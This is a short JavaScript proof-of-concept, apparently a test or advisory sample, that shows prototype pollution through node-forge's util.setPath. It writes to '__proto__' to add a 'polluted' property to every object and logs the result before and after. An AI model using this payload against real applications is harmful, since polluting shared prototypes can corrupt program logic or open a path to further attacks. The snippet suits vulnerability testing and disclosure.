Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const nodeforge = require('node-forge');
const obj = {};
nodeforge.util.setPath(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);